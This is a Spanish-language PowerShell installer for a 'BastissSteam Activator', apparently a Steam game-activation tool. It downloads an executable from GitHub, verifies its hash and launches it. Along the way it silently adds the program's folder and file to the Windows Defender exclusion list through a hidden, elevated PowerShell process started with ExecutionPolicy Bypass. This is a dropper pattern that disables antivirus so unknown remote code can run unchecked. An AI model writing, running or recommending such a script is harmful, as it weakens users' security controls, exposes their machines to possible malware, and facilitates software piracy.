$APP_DIR = Join-Path $env:LOCALAPPDATA 'BastissSteam'
$EXE_PATH = Join-Path $APP_DIR 'BastissSteamActivator2.exe'
$URL_EXE = 'https://github.com/bastisayes/Fixes-steam/releases/download/bastisss/BastissSteamActivator2.exe'
$EXPECTED_HASH = 'A40F994EE990EF615CFEC08EC3C6B6FA0994998C9BA6961B9A97C01B92F16D71'
function New-BsaShortcut {
    try {
        $shell = New-Object -ComObject WScript.Shell
        $lnk = $shell.CreateShortcut((Join-Path ([Environment]::GetFolderPath('Desktop')) 'BastissSteamActivator.lnk'))
        $lnk.TargetPath = $EXE_PATH
        $lnk.WorkingDirectory = $APP_DIR
        $lnk.Description = 'BastissSteam Activator'
        $lnk.Save()
    } catch {}
    try {
        $shell = New-Object -ComObject WScript.Shell
        $lnk = $shell.CreateShortcut((Join-Path ([Environment]::GetFolderPath('Programs')) 'BastissSteam Activator.lnk'))
        $lnk.TargetPath = $EXE_PATH
        $lnk.WorkingDirectory = $APP_DIR
        $lnk.Description = 'BastissSteam Activator'
        $lnk.Save()
    } catch {}
}
if (-not (Test-Path $APP_DIR)) { New-Item -ItemType Directory -Path $APP_DIR -Force | Out-Null }
$tmp = Join-Path $APP_DIR "bsa_$([guid]::NewGuid().ToString('N')).exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $URL_EXE -OutFile $tmp -UseBasicParsing -TimeoutSec 120
$len = (Get-Item -LiteralPath $tmp).Length
if ($len -lt 100000) { Remove-Item $tmp -Force; throw "Descarga incompleta" }
$h = (Get-FileHash $tmp -Algorithm SHA256).Hash
if ($h -ne $EXPECTED_HASH) { Remove-Item $tmp -Force; throw "Hash incorrecto ($h)" }
$needsExcl = $false
try {
    $existing = @()
    try { $existing = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath) } catch {}
    if (-not $existing -or $existing.Count -eq 0) { try { $existing = @((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue).PSObject.Properties.Name | Where-Object { $_ -notlike 'PS*' }) } catch {} }
    if ($existing -notcontains $APP_DIR) { $needsExcl = $true }
    elseif ($existing -notcontains $EXE_PATH) { $needsExcl = $true }
} catch { $needsExcl = $false }
$needsKillElevated = $false
$procs = Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue
if ($procs) {
    try { $procs | Stop-Process -Force -ErrorAction Stop; Start-Sleep -Milliseconds 500 } catch { if ($_.Exception.Message -match 'Acceso denegado|Access is denied') { $needsKillElevated = $true } }
    if (Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue) { $needsKillElevated = $true }
}
if ($needsExcl -or $needsKillElevated) {
    $elevCmd = ""
    if ($needsExcl) { $elevCmd += "Add-MpPreference -ExclusionPath '$APP_DIR' -Force; Add-MpPreference -ExclusionPath '$EXE_PATH' -Force; " }
    if ($needsKillElevated) { $elevCmd += "Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 600; " }
    $elevFile = Join-Path $env:TEMP "bsa_elev_$([guid]::NewGuid().ToString('N')).ps1"
    Set-Content -LiteralPath $elevFile -Value $elevCmd -Encoding UTF8
    $ep = Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$elevFile`"") -PassThru
    $ep.WaitForExit(20000) | Out-Null
    Remove-Item -LiteralPath $elevFile -Force -ErrorAction SilentlyContinue
}
for ($i=0; $i -lt 20; $i++) { if (-not (Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue)) { break }; Start-Sleep -Milliseconds 250 }
try { if (Test-Path -LiteralPath $EXE_PATH) { Remove-Item -LiteralPath $EXE_PATH -Force -ErrorAction SilentlyContinue }; Start-Sleep -Milliseconds 300; Move-Item -LiteralPath $tmp -Destination $EXE_PATH -Force -ErrorAction Stop }
catch {
    Start-Sleep -Milliseconds 1500
    try { if (Test-Path -LiteralPath $EXE_PATH) { Remove-Item -LiteralPath $EXE_PATH -Force -ErrorAction SilentlyContinue } } catch {}
    try { Move-Item -LiteralPath $tmp -Destination $EXE_PATH -Force -ErrorAction Stop } catch {
        [IO.File]::Copy($tmp, $EXE_PATH, $true)
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    }
}
Remove-Item $tmp -Force -ErrorAction SilentlyContinue
New-BsaShortcut
Start-Process -FilePath $EXE_PATH
Add-Type -AssemblyName System.Windows.Forms
$n = New-Object System.Windows.Forms.NotifyIcon
$n.Icon = [System.Drawing.SystemIcons]::Information
$n.Visible = $true
$n.ShowBalloonTip(3000, 'BastissSteam Activator', 'El programa se instalo y abrio correctamente.', [System.Windows.Forms.ToolTipIcon]::Info)
Start-Sleep -Seconds 4
$n.Dispose()
